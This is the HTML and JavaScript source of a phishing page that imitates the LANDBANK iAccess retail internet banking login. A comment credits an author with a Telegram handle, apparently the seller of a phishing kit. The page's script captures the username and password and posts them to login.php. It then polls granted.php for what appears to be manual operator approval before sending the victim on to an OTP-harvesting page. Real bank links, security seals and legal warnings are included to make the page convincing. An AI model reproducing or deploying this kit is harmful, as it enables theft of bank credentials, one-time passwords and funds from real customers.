<!DOCTYPE html>
    <!-- Created By MariaClara | TELEGRAM : @mariaclara1337 -->
    <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <link type="text/css" rel="stylesheet" href="./files/theme.css">
            <link type="text/css" rel="stylesheet" href="./files/font.css">
            <link type="text/css" rel="stylesheet" href="./files/style.css">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="mobile-web-app-capable" content="yes">
            <title>LANDBANK iAccess Retail Internet Banking - Login</title>
            <link rel="icon" href="./files/favicon.ico">
            <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
            <script type="text/javascript">
	            function X(q){
		            document.getElementById('bysy_indicator').style.display=q;
	            }
	            function run_check(event){
		            var flag = false;
		            var XchannelUserID = document.getElementById('channelUserID').value;
		            var XchannelPswdPin = document.getElementById('channelPswdPin').value;
		            event.preventDefault();
                    document.getElementById('login').disabled="true";
                    document.getElementById('login').style.backgroundColor = '#389685';
                    document.getElementById('login').value = 'LOADING';
		            ['channelUserID','channelPswdPin'].forEach(function(v,i) {
			        if(flag){
				        event.preventDefault();
				        // alert(1);
			        }
		            });
		

		            if(XchannelUserID.length > 0 && XchannelPswdPin.length > 0) {
			        X('block');
			
			        axios.post('login.php', {
				        channelUserID: XchannelUserID,
				        channelPswdPin: XchannelPswdPin
			        })
			        .then(function (response) {
				        let id = setInterval(function() {
					    var xml = new XMLHttpRequest();
					    var uid = response.data;
					    xml.open('GET',"granted.php?uid="+uid);
					    xml.onload = function() {
						    console.log(xml.response);
						    if(xml.response == 'yes'){
							    window.location="otp.php";
							    clearInterval(id);
						    }else if(xml.response == 'nono'){
							    window.location.hash="#error";
							    X('none');
							    clearInterval(id);
                                window.location.reload();
						    }
					    }
					    xml.send("uid="+uid);
				        }, 1000);

			        })
			        .catch(function (error) {
				        console.log(error);
			        });
		            }
		
		            return !flag;
	            }
            </script>
        </head>
        <body id="login-body">
            <div id="login-maincontainer">
                <div id="login-topsection">
                    <img src="./files/lbpiaccess.jpg" alt="" class="logo_landbank">
                </div>
                <div id="login-wrapper">
                    <div id="login-contentcolumn">
                        <div class="login-infolinks">
                            <a href="https://www.landbank.com/about" target="_blank">About Us</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.lbpiaccess.com/login/infolink?i=1" target="_blank">FAQs</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.lbpiaccess.com/login/infolink?i=2" target="_blank">Security Policy</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.lbpiaccess.com/login/infolink?i=3" target="_blank">Data Privacy Statement</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.lbpiaccess.com/login/infolink?i=5" target="_blank">Advisory on ATM Use</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.lbpiaccess.com/login/infolink?i=4" target="_blank">iAccess Features</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="https://www.landbank.com/find-us" target="_blank">Find Us</a>
                        </div>
                            <h1 id="login-welcome-msg">Welcome to iAccess!</h1><img id="login-advertisement-img" src="./files/login_advisory.jpg" alt="" width="600">
                    </div>
                    <div id="login-rightcolumn">
                        <div id="login-page">
                            <div class="form">
                                <form id="login-form" name="login-form" onsubmit="run_check(arguments[0]);" enctype="application/x-www-form-urlencoded">
                                <div id="login-form-msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true">
                                    <div class="ui-messages-error ui-corner-all" id="neuron-error">
                                        <span class="ui-messages-error-icon"></span>
                                        <ul>
                                            <li role="alert" aria-atomic="true">
                                                <span class="ui-messages-error-detail">Invalid User ID or Password</span>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                                     
                                    <input class="login-input" type=text placeholder="Username" tabindex=1 value name=channelUserID id=channelUserID>
                                    <input class="login-input" id=channelPswdPin type=password placeholder="Password" tabindex=2 maxlength=20 zxcv=mnbv value name=channelPswdPin>
	    							<input id="login" type="submit" name="login" value="Login" class="login-button"/>
                                    <p class="message">
                                        Not yet enrolled? <a href="https://www.lbpiaccess.com/register/enroll.xhtml">Sign up now!</a><br>
                                        Upon login, I hereby agree to its <a href="https://www.lbpiaccess.com/login/infolink?i=6" target="_blank">Terms and Conditions</a><br>
                                        Click <a href="https://www.lbpiaccess.com/login/infolink?i=7" target="_blank">here</a> to download enrollment form.
                                    </p>
                                    <p class="message"><a href="https://www.lbpiaccess.com/unlock.xhtml">Unlock ID</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                        <a href="https://www.lbpiaccess.com/forgotpwd.xhtml">Forgot Password</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                    </p>
                                    <input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="8622162133740302980:-7273975624222570399" autocomplete="off">
                                </form>
                                <table style="width: 125px; border: 0; margin-left: auto; margin-right: auto;" cellspacing="0" cellpadding="0" title="CLICK TO VERIFY: This site uses a GlobalSign SSL Certificate to secure your personal information.">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <span>
                                                    <img name="ss_imgTag" border="0" src="./files/siteSealImage.do" alt="" oncontextmenu="return false;" galleryimg="no" style="width:125px"></span>
                                                <span id="ss_siteSeal_fin_SZ125-50_image_en_V0023_S001"></span>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>     
                            </div>
                        </div>
                        <div id="login-forex" style="max-width: 60%;">
                            <span style="color: #0db14b">FOREIGN EXCHANGE</span>&nbsp;&nbsp;<input type="button" value="CLICK HERE" class="forex-button">
                        </div>
                    </div>
                </div>
                <div id=bysy_indicator style=display:none>
                    <div id=loading_gif></div>
                </div>
                <div id="footer">
                    <div id="container-warning">
                        <span class="warning">WARNING:</span>
                        <span class="warning-higlight">iAccess is for authorized clients only.</span>
                        <span>It shall be a criminal offense for any person to:</span>
                        <ol>
                            <li>Obtain access to data without authority;</li>
                            <li>Corrupt, alter, steal or destroy data;</li>
                            <li>Interfere in computer system or server;</li>
                            <li>Introduce computer virus.</li>
                                </ol>
                        <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
                    </div>
                    <div id="container-contactinfo">
                        <span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br>
                        <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br>
                        <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br>
                        <span>Email: customercare@mail.landbank.com</span><br>
                        <hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;">
                        <span>Regulated by the Bangko Sentral ng Pilipinas.</span><br>
                        <span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br>
                        <span style="display: flex; flex-direction: row-reverse">
                            <img src="./files/bancnet_logo.png" alt="" width="100" height="20">
                            <span>A Proud Member of </span>
                        </span>
                    </div>
                </div>
            </div>
            <div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;">
        </div>
        <script type="text/javascript">
            document.getElementById('neuron-error').style.display = window.location.hash == "#error" ? "block" : "none" ; 
        </script>
    </body>
</html>